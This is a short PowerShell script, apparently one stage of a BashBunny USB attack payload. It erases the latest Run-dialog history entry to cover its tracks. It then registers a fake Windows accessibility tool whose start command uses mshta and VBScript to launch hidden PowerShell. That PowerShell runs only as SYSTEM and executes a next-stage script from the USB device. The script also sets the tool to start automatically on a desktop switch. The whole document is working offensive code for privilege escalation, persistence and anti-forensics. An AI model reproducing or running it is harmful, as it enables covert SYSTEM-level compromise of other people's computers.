#Remove latest run entry
$p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"; $m = "MRUList"; $l=(gp $p).$m; rp $p $l[0]; sp $p $m $l.Substring(1);

# Create AT to run next stage
$at = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"
$atnt = $at+"\atnt"
New-Item -Path $at -Name "atnt" -Force
New-ItemProperty -Path $atnt -Name "CopySettingsToLockedDesktop" -Value 1 -PropertyType "DWord" -Force
New-ItemProperty -Path $atnt -Name "SimpleProfile" -Value "atnt" -PropertyType "String" -Force
New-ItemProperty -Path $atnt -Name "StartExe" -Value "%SystemRoot%\System32\mshta.exe" -PropertyType "ExpandString" -Force
New-ItemProperty -Path $atnt -Name "StartParams" -Value "vbscript:(CreateObject(""WScript.Shell"").Run(""powershell -w 1 -NoP if((whoami) -ne 'NT AUTHORITY\SYSTEM'){exit};iex(gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\!SWITCH!\3')-Raw)"",0)(Window.Close))" -PropertyType "String" -Force

#Add the newly created AT to automatically start on a desktop switch.
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility" -Name "Configuration" -Value "atnt" -PropertyType "String" -Force
